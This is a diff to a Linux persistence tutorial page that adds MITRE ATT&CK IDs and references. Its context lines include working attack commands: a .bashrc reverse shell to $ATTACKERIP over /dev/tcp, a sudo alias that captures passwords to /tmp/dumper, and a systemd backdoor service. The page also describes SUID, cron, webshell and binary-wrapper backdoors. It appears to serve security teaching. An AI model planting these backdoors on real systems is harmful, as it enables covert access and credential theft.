@@ -11,7 +11,7 @@ header:
   icon: 
 categories: linux
 permalink: /linux/persistence
-tags: [linux, persistence, tcp wrapper,cronjob,suid, backdoor]
+tags: [linux, persistence]
 
 ---
 
@@ -21,6 +21,8 @@ Persistence refers to strategies used by adversaries to maintain access to syste
 
 ---
 ## Creating privilege account
+
+[MITRE ID: T1136.001](https://attack.mitre.org/techniques/T1136/001/)
 
 The adversary tends to create a high privilege account to maintain access on the compromised system. They usually create a user with a sudo privilege across the system.
 
@@ -33,6 +35,8 @@ The adversary tends to create a high privilege account to maintain access on the
 
     
 ## Creating SUID Binary
+
+[MITRE ID: T1548.001](https://attack.mitre.org/techniques/T1548/001/)
 
 A binary with its SUID bit set, implying that everything run by the programs will be done with that user's privileges. If the SUID binary is set with root privilege, anyone that run the binary will have access on the system with the root privilege. Below is an example of creating a SUID binary named suid00r.
 
@@ -48,6 +52,8 @@ A binary with its SUID bit set, implying that everything run by the programs wil
 
 ## Creating cron job
 
+[MITRE ID: T1053.003](https://attack.mitre.org/techniques/T1053/003/)
+
 The crontab file contains a list of tasks that you wish to execute on a regular basis, as well as the name of the command that manages them. Crontab stands for "cron table," as it executes tasks using the cron job scheduler. 
 
 Adversary can create a reverse shell that pointing to their C2 server using cron job upon reboot. Below is a simple example of bash reverse shell as for the PoC.
@@ -58,6 +64,8 @@ Adversary can create a reverse shell that pointing to their C2 server using cron
 
 ## Creating .bashrc backdoor
 
+[MITRE ID: T1546.004](https://attack.mitre.org/techniques/T1546/004/)
+
 A bashrc file is a shell script file that Linux uses when starting up to load items like modules and aliases into user's profile. So, whenever an interactive session is launched, the .bashrc file will load the reverse shell pointing to the adversary C2 server.
 
 	$ Command:
@@ -65,6 +73,8 @@ A bashrc file is a shell script file that Linux uses when starting up to load it
 	victim@server$ echo "(setsid bash 1>&/dev/tcp/$ATTACKERIP/5555 0>&1 & ) 2>/dev/null" >> ~/.bashrc
 
 ## Creating .bashrc alias
+
+[MITRE ID: T1546.004](https://attack.mitre.org/techniques/T1546/004/)
 
 Same as .bashrc backdoor but it leverage linux alias. When we often need to use a single large command several times, we construct an alias for it.
 Alias is a shortcut command that performs the same functions as if we typed the entire command. 
@@ -75,7 +85,9 @@ As for the PoC, we use `sudo` alias. Whenever the user type sudo command for exa
 	
 	victim@server$ echo "alias sudo='echo -n "[sudo] password for "\$USER": " && read -r password && echo ""\$password"" >/tmp/dumper && /usr/bin/sudo \$@'" >> ~/.bashrc
 
-## Creating systemd backdoor
+## Creating systemd backdoor 
+
+[MITRE ID: T1543.002](https://attack.mitre.org/techniques/T1543/002/)
 
 For Linux operating systems, Systemd is a system and service manager. It includes capabilities such as parallel launch of system services at boot time, on-demand activation of daemons, and dependency-based service control logic, and is meant to be backwards compatible with SysV init scripts.
 
@@ -100,6 +112,8 @@ As for the PoC, we create `backdoorx` service in /etc/systemd/system/ directory.
 	root@victim$ systemctl enable $SYSTEMD_NAME.service
 
 ## Creating SSH authorized_keys
+
+[MITRE ID: T1098.004](https://attack.mitre.org/techniques/T1098/004/)
 
 In SSH, the authorized keys file defines the SSH keys that can be used to login into the user account for whom the file is set up. It's a crucial configuration file since it sets up persistent access through SSH keys.
 
@@ -129,6 +143,8 @@ As for the PoC, we created a MOTD banner named 20-motd-bas that will make a reve
 How does it work? At each login, pam motd(8) as the root user invokes executable scripts in /etc/update-motd.d/*, and this information is concatenated in /var/run/motd. The run-parts(8) –lsbsysinit option controls the order in which scripts are executed (essentially alphabetical order, with a few exceptions). 
 
 ## Creating Webshell as backdoor
+
+[MITRE ID: T1505.003](https://attack.mitre.org/techniques/T1505/003/)
 
 Adversary commonly placed a webshell for later access. A simple PoC as shown below.
 
@@ -164,6 +180,8 @@ There are four directories in which scripts can be placed which will always be r
 
 ## Creating binary wrapper
 
+[MITRE ID: T1574.008](https://attack.mitre.org/techniques/T1574/008/)
+
 Adversary may created a wrapper from a legitimate binary as simple as shown below. Whenever, any user type command `date`, a reverse shell is spawned to the C2.
 
 	$ Command:
@@ -198,3 +216,6 @@ If someone connect to any port on target machine such as SSH, reverse shell will
 ## Reference
 - https://manpages.debian.org/testing/ifupdown/interfaces.5.en.html
 - https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/
+- https://attack.mitre.org/techniques/T1574/008/
+- https://attack.mitre.org/techniques/T1505/003/
+- https://attack.mitre.org/techniques/T1543/002/
